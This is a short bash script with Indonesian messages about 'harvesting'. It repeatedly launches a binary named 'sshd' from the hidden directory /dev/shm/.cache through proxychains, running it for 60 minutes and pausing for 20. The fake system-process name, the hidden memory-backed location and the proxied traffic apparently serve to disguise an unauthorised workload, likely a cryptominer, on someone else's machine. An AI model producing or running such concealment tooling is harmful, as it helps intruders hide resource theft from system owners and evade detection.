#!/bin/bash

while true
do
    echo "PANEN DI MULAI... (60 menit)"
    proxychains4 -f ~/.proxychains/proxychains.conf /dev/shm/.cache/sshd &
    PANEN_PID=$!
    
    sleep 3600  # Panen selama 60 menit

    echo "Istirahat 20 menit..."
    kill $PANEN_PID  # Hentikan Panen
    sleep 1200  # Istirahat 20 menit
done
